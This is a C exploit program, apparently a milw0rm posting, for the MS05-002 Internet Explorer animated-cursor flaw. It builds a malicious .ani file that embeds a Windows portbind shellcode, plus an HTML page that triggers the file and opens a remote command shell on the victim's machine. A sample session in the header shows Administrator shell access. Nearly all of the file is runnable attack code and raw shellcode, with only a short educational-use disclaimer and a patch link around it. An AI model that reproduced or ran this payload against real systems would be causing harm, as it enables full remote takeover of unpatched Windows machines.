/* Added string.h /str0ke */
/* HOD-ms05002-ani-expl.c: 2005-01-10: PUBLIC v.0.2
 *
 * Copyright (c) 2004-2005 houseofdabus.
 *
 * (MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit
 * (CAN-2004-1049)
 *
 *
 *
 *                 .::[ houseofdabus ]::.
 *
 *
 *
 * (universal -- for all affected systems)
 * ---------------------------------------------------------------------
 * Description:
 *    A remote code execution vulnerability exists in the way that
 *    cursor, animated cursor, and icon formats are handled. An attacker
 *    could try to exploit the vulnerability by constructing a malicious
 *    cursor or icon file that could potentially allow remote code
 *    execution if a user visited a malicious Web site or viewed a
 *    malicious e-mail message. An attacker who successfully exploited
 *    this vulnerability could take complete control of an affected
 *    system.
 *
 * ---------------------------------------------------------------------
 * Patch:
 *    http://www.microsoft.com/technet/security/Bulletin/MS05-002.mspx
 *
 * ---------------------------------------------------------------------
 * Tested on:
 *    - Windows Server 2003
 *    - Windows XP SP1
 *    - Windows XP SP0
 *    - Windows 2000 SP4
 *    - Windows 2000 SP3
 *    - Windows 2000 SP2
 *
 * ---------------------------------------------------------------------
 * Compile:
 *
 * Win32/VC++  : cl -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c
 * Win32/cygwin: gcc -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c
 * Linux       : gcc -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c
 *
 * ---------------------------------------------------------------------
 * Example:
 *
 * C:\>HOD-ms05002-ani-expl.exe poc 7777
 * <...>
 * [*] Creating poc.ani file ... Ok
 * [*] Creating poc.html file ... Ok
 *
 * C:\>
 *
 * start IE -> C:\poc.html
 *
 * C:\>telnet localhost 7777
 * Microsoft Windows 2000 [Version 5.00.2195]
 * (C) Copyright 1985-2000 Microsoft Corp.
 *
 * C:\Documents and Settings\Administrator\Desktop>
 *
 * ---------------------------------------------------------------------
 *
 *   This is provided as proof-of-concept code only for educational
 *   purposes and testing by authorized individuals with permission to
 *   do so.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ANI header */
unsigned char aniheader[] =
"\x52\x49\x46\x46\x9c\x18\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
"\x7c\x03\x00\x00\x24\x00\x00\x00\x08\x00\x00\x00\x08\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

/* jmp offset, no Jitsu */
"\x77\x82\x40\x00\xeb\x64\x90\x90\x77\x82\x40\x00\xeb\x64\x90\x90"
"\xeb\x54\x90\x90\x77\x82\x40\x00\xeb\x54\x90\x90\x77\x82\x40\x00"
"\xeb\x44\x90\x90\x77\x82\x40\x00\xeb\x44\x90\x90\x77\x82\x40\x00"
"\xeb\x34\x90\x90\x77\x82\x40\x00\xeb\x34\x90\x90\x77\x82\x40\x00"
"\xeb\x24\x90\x90\x77\x82\x40\x00\xeb\x24\x90\x90\x77\x82\x40\x00"
"\xeb\x14\x90\x90\x77\x82\x40\x00\xeb\x14\x90\x90\x77\x82\x40\x00"
"\x77\x82\x40\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


/* portbind shellcode */
unsigned char shellcode[] =
"\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c"
"\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b"
"\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78"
"\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b"
"\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03"
"\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b"
"\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c"
"\x61\xc3\xeb\x3d\xad\x50\x52\xe8\xa8\xff\xff\xff\x89\x07\x83\xc4"
"\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3\x8e\x4e\x0e\xec\x72\xfe\xb3"
"\x16\x7e\xd8\xe2\x73\xad\xd9\x05\xce\xd9\x09\xf5\xad\xa4\x1a\x70"
"\xc7\xa4\xad\x2e\xe9\xe5\x49\x86\x49\xcb\xed\xfc\x3b\xe7\x79\xc6"
"\x79\x83\xec\x60\x8b\xec\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5e"
"\xe8\x3d\xff\xff\xff\x8b\xd0\x83\xee\x36\x8d\x7d\x04\x8b\xce\x83"
"\xc1\x10\xe8\x9d\xff\xff\xff\x83\xc1\x18\x33\xc0\x66\xb8\x33\x32"
"\x50\x68\x77\x73\x32\x5f\x8b\xdc\x51\x52\x53\xff\x55\x04\x5a\x59"
"\x8b\xd0\xe8\x7d\xff\xff\xff\xb8\x01\x63\x6d\x64\xc1\xf8\x08\x50"
"\x89\x65\x34\x33\xc0\x66\xb8\x90\x01\x2b\xe0\x54\x83\xc0\x72\x50"
"\xff\x55\x24\x33\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\x55\x14"
"\x8b\xf0\x33\xc0\x33\xdb\x50\x50\x50\xb8\x02\x01\x11\x5c\xfe\xcc"
"\x50\x8b\xc4\xb3\x10\x53\x50\x56\xff\x55\x18\x53\x56\xff\x55\x1c"
"\x53\x8b\xd4\x2b\xe3\x8b\xcc\x52\x51\x56\xff\x55\x20\x8b\xf0\x33"
"\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33\xc0\xf3\xaa\x5f\xc6\x07\x44"
"\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f\x38\xab\xab\xab\x5f\x33\xc0\x8d"
"\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50\xff\x75\x34\x50"
"\xff\x55\x08\xf7\xd0\x50\xff\x36\xff\x55\x10\xff\x77\x38\xff\x55"
"\x28\xff\x55\x0c";

#define SET_PORTBIND_PORT(buf, port)	*(unsigned short *)(((buf)+300)) = (port)

unsigned char discl[] =
"This is provided as proof-of-concept code only for educational"
" purposes and testing by authorized individuals with permission"
" to do so.";

unsigned char html[] =
"<html>\n"
"(MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit"
"<br>Copyright (c) 2004-2005 .: houseofdabus :.<br><a href =\""
"http://www.microsoft.com/technet/security/Bulletin/MS05-002.mspx\">"
"Patch (MS05-002)</a>\n"
"<script>alert(\"%s\")</script>\n<head>\n\t<style>\n"
"\t\t* {CURSOR: url(\"%s.ani\")}\n\t</style>\n</head>\n"
"</html>";


unsigned short
fixx(unsigned short p)
{
	unsigned short r = 0;
	r  = (p & 0xFF00) >> 8;
	r |= (p & 0x00FF) << 8;

return r;
}

void
usage(char *prog)
{
	printf("Usage:\n");
	printf("%s <file> <bindport>\n\n", prog);
	exit(0);
}


int
main(int argc, char **argv)
{
	FILE *fp;
	unsigned short port;
	unsigned char f[256+5] = "";
	unsigned char anib[912] = "";


	printf("\n(MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit\n\n");
	printf("\tCopyright (c) 2004-2005 .: houseofdabus :.\n\n\n");
	printf("Tested on all affected systems:\n");
	printf("   [+] Windows Server 2003\n   [+] Windows XP SP1, SP0\n");
	printf("   [+] Windows 2000 All SP\n\n");

	printf("%s\n\n", discl);
	if ( (sizeof(shellcode)-1) > (912-sizeof(aniheader)-3) ) {
		printf("[-] Size of shellcode must be <= 686 bytes\n");
		return 0;
	}
	if (argc < 3) usage(argv[0]);

	if (strlen(argv[1]) > 256) {
		printf("[-] Size of filename must be <=256 bytes\n");
		return 0;
	}

	/* creating ani file */
	strcpy(f, argv[1]);
	strcat(f, ".ani");
	printf("[*] Creating %s file ...", f);
	fp = fopen(f, "wb");
	if (fp == NULL) {
		printf("\n[-] error: can\'t create file: %s\n", f);
		return 0;
	}
	memset(anib, 0x90, 912);

	/* header */
	memcpy(anib, aniheader, sizeof(aniheader)-1);
	/* shellcode */
	port = atoi(argv[2]);
	SET_PORTBIND_PORT(shellcode, fixx(port));
	memcpy(anib+sizeof(aniheader)-1, shellcode, sizeof(shellcode)-1);

	fwrite(anib, 1, 912, fp);
	printf(" Ok\n");
	fclose(fp);

	/* creating html file */
	f[0] = '\0';
	strcpy(f, argv[1]);
	strcat(f, ".html");
	printf("[*] Creating %s file ...", f);
	fp = fopen(f, "wb");
	if (fp == NULL) {
		printf("\n[-] error: can\'t create file: %s\n", f);
		return 0;
	}
	sprintf(anib, html, discl, argv[1]);
	fwrite(anib, 1, strlen(anib), fp);
	printf(" Ok\n");
	fclose(fp);

return 0;
}

// milw0rm.com [2005-01-22]
